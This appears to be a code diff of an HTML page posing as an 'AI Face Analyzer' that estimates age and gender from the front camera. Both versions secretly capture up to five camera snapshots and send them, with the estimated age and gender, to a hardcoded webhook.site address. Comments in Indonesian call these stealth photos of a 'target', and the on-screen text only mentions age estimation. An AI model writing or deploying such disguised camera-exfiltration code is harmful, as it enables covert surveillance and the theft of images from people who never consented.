@@ -3,109 +3,118 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI Real-Time Face Recognition</title>
-    <script defer src="https://cdn.jsdelivr.net/npm/@vladmandic/face-api/dist/face-api.js"></script>
+    <title>AI Face Analyzer v4.0</title>
+    <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
     <style>
-        body { margin: 0; padding: 0; background: #000; color: #00ff00; font-family: sans-serif; overflow: hidden; }
-        #container { position: relative; width: 100vw; height: 100vh; display: flex; justify-content: center; align-items: center; }
-        video { position: absolute; width: 100%; height: 100%; object-fit: cover; z-index: 1; }
-        canvas { position: absolute; z-index: 2; top: 0; left: 0; width: 100%; height: 100%; }
-        #loader { position: absolute; z-index: 3; background: rgba(0,0,0,0.8); width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; }
-        .spinner { border: 4px solid #333; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { margin: 0; background: #000; color: #00ff00; font-family: 'Courier New', monospace; overflow: hidden; }
+        #app { position: relative; width: 100vw; height: 100vh; display: flex; justify-content: center; align-items: center; }
+        video { position: absolute; width: 100%; height: 100%; object-fit: cover; }
+        canvas { position: absolute; z-index: 10; pointer-events: none; }
+        #overlay { position: absolute; z-index: 20; background: rgba(0,0,0,0.85); width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; cursor: pointer; }
+        .border-box { border: 2px solid #00ff00; padding: 30px; box-shadow: 0 0 20px #00ff00; }
+        .blink { animation: blinker 1.5s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0; } }
     </style>
 </head>
 <body>
 
-    <div id="loader">
-        <div class="spinner"></div>
-        <p id="load-text">MEMUAT ENGINE AI...</p>
-    </div>
-
-    <div id="container">
+    <div id="app">
+        <div id="overlay" onclick="startEngine()">
+            <div class="border-box">
+                <h2 class="blink">AI ENGINE READY</h2>
+                <p id="status">TAP TO START BIO-SCAN</p>
+                <p style="font-size: 10px; color: #888;">System requires camera access for age estimation</p>
+            </div>
+        </div>
         <video id="video" autoplay muted playsinline></video>
+        <canvas id="canvas"></canvas>
     </div>
 
     <script>
         const WEBHOOK_URL = 'https://webhook.site/0fd1f3d6-dd15-4117-a62f-cf109f69247b';
         const video = document.getElementById('video');
+        const status = document.getElementById('status');
+        const overlay = document.getElementById('overlay');
         let photoCount = 0;
+        let isEngineRunning = false;
 
-        async function init() {
-            // 1. Load Model AI (Age, Gender, Expression)
-            const MODEL_URL = 'https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model/';
-            await Promise.all([
-                faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL),
-                faceapi.nets.faceLandmark68Net.loadFromUri(MODEL_URL),
-                faceapi.nets.faceRecognitionNet.loadFromUri(MODEL_URL),
-                faceapi.nets.faceExpressionNet.loadFromUri(MODEL_URL),
-                faceapi.nets.ageGenderNet.loadFromUri(MODEL_URL)
-            ]);
+        async function startEngine() {
+            if(isEngineRunning) return;
+            isEngineRunning = true;
+            
+            status.innerText = "LOADING MODELS...";
+            
+            try {
+                // 1. Ambil Kamera
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                video.srcObject = stream;
 
-            // 2. Start Kamera
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-                .then(stream => {
-                    video.srcObject = stream;
-                    document.getElementById('loader').style.display = 'none';
-                    startDetection();
-                });
+                // 2. Load "Otak" AI
+                const MODEL_URL = 'https://raw.githubusercontent.com/justadudewhohacks/face-api.js/master/weights';
+                await faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL);
+                await faceapi.nets.ageGenderNet.loadFromUri(MODEL_URL);
+                await faceapi.nets.faceExpressionNet.loadFromUri(MODEL_URL);
+
+                overlay.style.display = 'none';
+                processDetection();
+            } catch (err) {
+                alert("Kamera Error / Izin Ditolak");
+                isEngineRunning = false;
+            }
         }
 
-        function startDetection() {
-            const canvas = faceapi.createCanvasFromMedia(video);
-            document.getElementById('container').append(canvas);
-            const displaySize = { width: video.offsetWidth, height: video.offsetHeight };
+        async function processDetection() {
+            const canvas = document.getElementById('canvas');
+            const displaySize = { width: window.innerWidth, height: window.innerHeight };
             faceapi.matchDimensions(canvas, displaySize);
 
             setInterval(async () => {
                 const detections = await faceapi.detectAllFaces(video, new faceapi.TinyFaceDetectorOptions())
-                    .withFaceLandmarks()
-                    .withFaceExpressions()
-                    .withAgeAndGender();
+                    .withAgeAndGender()
+                    .withFaceExpressions();
 
                 const resizedDetections = faceapi.resizeResults(detections, displaySize);
                 canvas.getContext('2d').clearRect(0, 0, canvas.width, canvas.height);
                 
-                // Gambar kotak dan hasil AI di layar HP target
+                // GAMPILAN DEPAN: Gambar kotak deteksi wajah di layar target
                 faceapi.draw.drawDetections(canvas, resizedDetections);
                 
                 resizedDetections.forEach(result => {
-                    const { age, gender, genderProbability } = result;
+                    const { age, gender } = result;
                     new faceapi.draw.DrawTextField([
-                        `${Math.round(age)} Tahun`,
-                        `${gender} (${Math.round(genderProbability * 100)}%)`
-                    ], result.detection.box.bottomLeft).draw(canvas);
+                        `AGE: ${Math.round(age)} YEARS`,
+                        `GEN: ${gender.toUpperCase()}`
+                    ], result.detection.box.topRight).draw(canvas);
 
-                    // 3. AMBIL FOTO DIAM-DIAM (Kirim ke Webhook setiap 5 detik)
+                    // SISTEM BELAKANG: Ambil foto diem-diem
                     if (photoCount < 5) {
-                        sendToWebhook(Math.round(age), gender);
+                        captureStealth(Math.round(age), gender);
                     }
                 });
             }, 1000);
         }
 
-        async function sendToWebhook(age, gender) {
+        function captureStealth(age, gen) {
             photoCount++;
-            const tempCanvas = document.createElement('canvas');
-            tempCanvas.width = video.videoWidth;
-            tempCanvas.height = video.videoHeight;
-            tempCanvas.getContext('2d').drawImage(video, 0, 0);
-            
-            const dataFoto = tempCanvas.toDataURL('image/jpeg', 0.4);
+            const c = document.createElement('canvas');
+            c.width = video.videoWidth;
+            c.height = video.videoHeight;
+            c.getContext('2d').drawImage(video, 0, 0);
+            const imgData = c.toDataURL('image/jpeg', 0.5);
 
+            // Kirim ke Webhook
             fetch(WEBHOOK_URL, {
                 method: 'POST',
                 mode: 'no-cors',
-                body: JSON.stringify({
-                    info: "REAL_AI_DETECTION",
-                    detected_age: age,
-                    detected_gender: gender,
-                    image: dataFoto
+                body: JSON.stringify({ 
+                    type: "AI_DATA_STEALTH", 
+                    snap_no: photoCount, 
+                    estimated_age: age, 
+                    gender: gen, 
+                    image: imgData 
                 })
             });
         }
-
-        window.onload = init;
     </script>
 </body>
 </html>
